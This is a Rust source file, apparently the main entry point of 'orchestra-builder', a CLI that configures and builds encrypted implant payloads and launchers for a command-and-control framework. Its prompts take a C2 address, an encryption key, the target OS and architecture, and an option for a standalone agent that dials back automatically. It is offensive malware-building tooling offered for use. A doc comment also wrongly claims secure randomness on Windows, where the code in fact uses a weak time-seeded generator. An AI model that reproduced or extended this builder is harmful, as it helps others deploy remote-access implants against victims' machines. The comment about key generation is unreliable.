//! Orchestra Builder — unified CLI for producing deployable agent payloads.

mod build;
mod config;
mod deps;

use anyhow::{Context, Result};
use base64::Engine;
use clap::{Parser, Subcommand};
use dialoguer::{theme::ColorfulTheme, Confirm, Input, MultiSelect, Select};
use tracing::info;

use crate::config::{
    list_profiles, load_profile, profile_path, read_agent_features, save_profile, PayloadConfig,
    PROFILES_DIR,
};

#[derive(Parser, Debug)]
#[command(
    name = "orchestra-builder",
    version,
    about = "Build, configure, and package Orchestra agent payloads."
)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand, Debug)]
enum Cmd {
    /// Verify host has all required toolchains/packages.
    Setup {
        /// Attempt to install missing rust targets via `rustup target add`.
        #[arg(long)]
        auto_install: bool,
    },
    /// Interactively create a new profile and save it under `profiles/`.
    Configure {
        /// Profile name (file will be `profiles/<name>.toml`).
        #[arg(long)]
        name: Option<String>,
    },
    /// List all `profiles/*.toml` entries.
    ListProfiles,
    /// Print a single profile's contents.
    ShowProfile {
        /// Profile name (without `.toml`) or full path to a TOML file.
        name: String,
    },
    /// Build the agent for a profile and emit `dist/<name>.enc`.
    Build {
        /// Profile name or path.
        profile: String,
    },
    /// Build the launcher binary that pairs with a profile.
    BuildLauncher {
        /// Profile name or path.
        profile: String,
    },
}

fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .init();

    let cli = Cli::parse();
    match cli.cmd {
        Cmd::Setup { auto_install } => cmd_setup(auto_install),
        Cmd::Configure { name } => cmd_configure(name),
        Cmd::ListProfiles => cmd_list_profiles(),
        Cmd::ShowProfile { name } => cmd_show_profile(&name),
        Cmd::Build { profile } => cmd_build(&profile),
        Cmd::BuildLauncher { profile } => cmd_build_launcher(&profile),
    }
}

// ---- subcommand implementations -------------------------------------------

fn cmd_setup(auto_install: bool) -> Result<()> {
    let dep_result = deps::ensure_dependencies();

    if auto_install
        && Confirm::with_theme(&ColorfulTheme::default())
            .with_prompt("Run `rustup target add ...` for any missing rust targets?")
            .default(true)
            .interact()
            .unwrap_or(false)
    {
        deps::auto_install_rust_targets()?;
        // Re-check after install.
        return deps::ensure_dependencies();
    }

    dep_result
}

fn cmd_configure(name: Option<String>) -> Result<()> {
    let theme = ColorfulTheme::default();

    let name = match name {
        Some(n) => n,
        None => Input::with_theme(&theme)
            .with_prompt("Profile name")
            .interact_text()?,
    };

    let os_choices = ["linux", "windows", "macos"];
    let os_idx = Select::with_theme(&theme)
        .with_prompt("Target OS")
        .items(&os_choices)
        .default(0)
        .interact()?;

    let arch_choices = ["x86_64", "aarch64"];
    let arch_idx = Select::with_theme(&theme)
        .with_prompt("Target architecture")
        .items(&arch_choices)
        .default(0)
        .interact()?;

    let c2_address: String = Input::with_theme(&theme)
        .with_prompt("C2 address (host:port)")
        .default("127.0.0.1:7890".into())
        .interact_text()?;

    // Encryption key: generate random by default, or accept manual base64,
    // or accept a file path.
    let key_choice_items = [
        "Generate a new random 32-byte key",
        "Enter base64 key",
        "Use a key file",
    ];
    let key_choice = Select::with_theme(&theme)
        .with_prompt("Encryption key source")
        .items(&key_choice_items)
        .default(0)
        .interact()?;
    let encryption_key = match key_choice {
        0 => {
            let mut buf = [0u8; 32];
            getrandom_fallback(&mut buf);
            base64::engine::general_purpose::STANDARD.encode(buf)
        }
        1 => Input::with_theme(&theme)
            .with_prompt("Base64-encoded 32-byte key")
            .interact_text()?,
        _ => {
            let path: String = Input::with_theme(&theme)
                .with_prompt("Path to key file (32 raw bytes)")
                .interact_text()?;
            format!("file:{path}")
        }
    };

    let feature_choices_owned = match read_agent_features() {
        Ok(v) if !v.is_empty() => v,
        Ok(_) => {
            eprintln!(
                "warning: agent/Cargo.toml has no [features] section; no feature flags offered"
            );
            Vec::new()
        }
        Err(e) => {
            eprintln!("warning: could not parse agent/Cargo.toml ({e}); no feature flags offered");
            Vec::new()
        }
    };
    let feature_choices: Vec<&str> = feature_choices_owned.iter().map(|s| s.as_str()).collect();
    let selected = if feature_choices.is_empty() {
        Vec::new()
    } else {
        MultiSelect::with_theme(&theme)
            .with_prompt("Cargo features (space to toggle, enter to confirm)")
            .items(&feature_choices)
            .interact()?
    };
    let features: Vec<String> = selected
        .into_iter()
        .map(|i| feature_choices[i].to_string())
        .collect();

    // When outbound-c is requested the payload is an `agent-standalone` binary
    // that dials back automatically, not the in-memory launcher.
    let outbound = features.iter().any(|f| f == "outbound-c");
    let (package, bin_name) = if outbound {
        ("agent".to_string(), Some("agent-standalone".to_string()))
    } else {
        ("launcher".to_string(), None)
    };

    // Optional PSK for the agent→server AES-TCP channel (outbound-c only).
    let c_server_secret: Option<String> = if outbound {
        let s: String = Input::with_theme(&theme)
            .with_prompt(
                "Control Center pre-shared secret (must match `agent_shared_secret` in \
                 orchestra-server.toml; blank = read ORCHESTRA_SECRET at runtime)",
            )
            .allow_empty(true)
            .interact_text()?;
        if s.trim().is_empty() {
            None
        } else {
            Some(s)
        }
    } else {
        None
    };

    let output_name: String = Input::with_theme(&theme)
        .with_prompt("Output binary name (blank = same as profile)")
        .allow_empty(true)
        .interact_text()?;

    let cfg = PayloadConfig {
        target_os: os_choices[os_idx].into(),
        target_arch: arch_choices[arch_idx].into(),
        c2_address,
        encryption_key,
        c_server_secret,
        features,
        output_name: if output_name.trim().is_empty() {
            None
        } else {
            Some(output_name)
        },
        package,
        bin_name,
    };

    // Validate before writing.
    cfg.target_triple()?;
    cfg.resolve_key()
        .context("Generated/entered encryption key did not validate")?;

    let path = save_profile(&name, &cfg)?;
    info!(path = %path.display(), "profile saved");

    // Round-trip self-check.
    let parsed = load_profile(&name)?;
    parsed.target_triple()?;
    info!(
        "profile reloaded successfully ({} features)",
        parsed.features.len()
    );

    Ok(())
}

fn cmd_list_profiles() -> Result<()> {
    let names = list_profiles()?;
    if names.is_empty() {
        println!("No profiles found in {PROFILES_DIR}/");
        return Ok(());
    }
    println!("Profiles in {PROFILES_DIR}/:");
    for n in names {
        println!("  - {n}  ({})", profile_path(&n).display());
    }
    Ok(())
}

fn cmd_show_profile(name: &str) -> Result<()> {
    let cfg = load_profile(name)?;
    let text = toml::to_string_pretty(&cfg)?;
    println!("{text}");
    Ok(())
}

fn cmd_build(profile: &str) -> Result<()> {
    let cfg = load_profile(profile)?;
    // For path inputs, derive a sensible profile name for the output file.
    let stem = std::path::Path::new(profile)
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or(profile)
        .to_string();
    let out = build::build_payload(&stem, &cfg)?;
    println!("Encrypted payload: {}", out.display());
    Ok(())
}

fn cmd_build_launcher(profile: &str) -> Result<()> {
    let cfg = load_profile(profile)?;
    let stem = std::path::Path::new(profile)
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or(profile)
        .to_string();
    let out = build::build_launcher_for_profile(&stem, &cfg)?;
    println!("Launcher: {}", out.display());
    Ok(())
}

/// Fill `buf` with cryptographically-random bytes. Uses `/dev/urandom` on
/// Unix and `BCryptGenRandom` indirectly on Windows via `std::collections`'s
/// hash-randomisation seed source. For a builder CLI this is adequate; for
/// production keys we recommend `--key-file` with bytes from a HSM.
fn getrandom_fallback(buf: &mut [u8]) {
    #[cfg(unix)]
    {
        use std::io::Read;
        if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
            if f.read_exact(buf).is_ok() {
                return;
            }
        }
    }
    // Last-resort fallback: time-mixed PRNG. Loud warning so operators don't
    // ship this in production.
    tracing::warn!("Falling back to weak PRNG for key generation; prefer --key-file");
    let mut state: u64 = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0xDEADBEEF);
    for b in buf.iter_mut() {
        state = state
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        *b = (state >> 33) as u8;
    }
}
